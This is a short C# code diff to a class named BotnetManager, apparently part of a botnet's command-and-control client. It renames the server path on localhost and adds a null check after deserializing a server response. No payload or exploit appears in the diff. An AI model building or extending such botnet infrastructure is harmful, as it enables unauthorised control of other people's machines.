@@ -12,7 +12,7 @@ namespace Master.Botnet
 {
     public static class BotnetManager
     {
-        const string SERVER_ADDRESS = "http://localhost/botnet/";
+        const string SERVER_ADDRESS = "http://localhost/backnet/";
 
         internal const string KEY = "{your_key_here}";
 
@@ -168,6 +168,7 @@ namespace Master.Botnet
             try
             {
                 response = JsonConvert.DeserializeObject<T>(GetServerStringResponse(json).Result, jsonSerializerSettings);
+                if(response == null) throw new JsonSerializationException();
             }
             catch (JsonSerializationException)
             {
